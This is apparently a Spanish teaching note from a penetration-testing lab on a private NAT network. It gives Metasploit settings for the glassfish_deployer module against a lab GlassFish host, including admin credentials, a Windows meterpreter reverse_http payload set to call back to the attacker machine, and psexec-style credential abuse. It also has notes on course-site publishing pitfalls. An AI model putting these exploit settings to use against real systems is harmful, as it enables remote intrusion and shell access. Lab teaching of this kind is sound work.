## 1. Tutoría abierta: glassfish_deployer sin sesión (lo más caliente)

Objetivo `10.0.2.4:4848` (GlassFish Open Source Edition, caja Windows). Kali `10.0.2.5`,
red NAT `10.0.2.0/24`.

**Config que YA autentica** (verificada por web con `admin`/`sploit`):
```
set USERNAME admin
set PASSWORD sploit
set SSL true
set RPORT 4848
set TARGETURI /
```
**El problema es el payload:** `java/meterpreter/reverse_tcp` **no es compatible** — este
módulo despliega un **binario nativo**, así que el payload debe coincidir con el SO del host
(Windows). «Exploit completed but no session» = el WAR se desplegó, pero el binario no llamó
de vuelta (payload de SO equivocado o puerto bloqueado).

**Siguiente a probar:**
```
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 10.0.2.5
set LPORT 8080          # o 443; HTTP pasa firewalls mejor que 4444 TCP
exploit
```
Si sigue sin sesión: confirmar SO con `sysinfo`/`nmap -O 10.0.2.4`; probar `windows/x64/...`;
revisar firewall de salida. `show payloads` lista los compatibles.

## Lo que aprendimos en la tutoría (reutilizable)

**`find -name` compara el basename COMPLETO, no subcadena.** `find / -name "ssh_login"` da
cero (el archivo es `ssh_login.rb`). Usar `find / -name "*ssh_login*"` o el nombre con `.rb`.
Esto causó una falsa alarma de «módulos faltantes» que no faltaban.

**GlassFish admin console = HTTPS en 4848.** Sin `set SSL true` el módulo habla HTTP a un
puerto TLS → recibe basura → `Unsupported version:` vacío y falla la auth. El usuario admin es
**`admin`** (cuenta del app-server), **no** la cuenta del SO (`vagrant`). En esta OVA:
`admin`/`sploit`.

**`glassfish_deployer` no es un CVE:** abusa del deploy legítimo (auth → sube WAR → despliega →
ejecuta). Rechaza payloads `java/` → usa binario nativo → el payload debe ser del SO del host.
`psexec` igual: no es exploit, es abuso de credenciales admin (T1021.002) — sube servicio a
`ADMIN$`, deja evento 7045.

**«Exploit completed but no session» con auth OK** = la explotación funcionó, el payload no
volvió. Sospechar: SO equivocado del payload, x86 vs x64, o firewall del puerto de vuelta.

## Critical Anti-Patterns (do NOT repeat)

| Patrón | Descripción | Severidad | Prevención |
|--------|-------------|-----------|------------|
| Nombres de alumno / clave de respuestas en repo público | El repo es PUBLIC (verificado con gh) y `docs/`+posts se pushean | advisory | La clave va en `issues/` (gitignored). Solo el docente decide qué del enunciado es público |
| Post con `date` futura no renderiza | GitHub Pages excluye posts futuros | advisory | date en pasado para publicar; la fecha real del examen va en el cuerpo, no en el front-matter |
| Servidores jekyll detached residuales | `serve --detach`/background deja procesos que devuelven exit 144 | advisory | `pkill -9 -f jekyll` antes de build/serve y al pausar |
| `find -name` con nombre pelado | `-name` matchea el basename completo; sin `.rb`/`*` da cero | advisory | Usar `find / -name "*nombre*"` o incluir la extensión exacta |
| GlassFish: HTTP a puerto HTTPS / usuario del SO | `Unsupported version:` vacío = falta `SSL true`; auth falla con la cuenta `vagrant` en vez de `admin` | advisory | 4848 = HTTPS (`set SSL true`); usuario del app-server es `admin` (aquí `admin`/`sploit`) |
| Payload `java/` en glassfish_deployer / SO equivocado | El módulo despliega binario nativo; el payload debe coincidir con el SO del host | advisory | `show payloads`; host GlassFish = caja Windows → `windows/...`; `reverse_http` si el TCP no vuelve |
| Verificar HTML de Chirpy con `grep` del comando | Rouge trocea el código en `<span>` | advisory | Grepear texto plano (comentarios/prosa), no el comando literal |
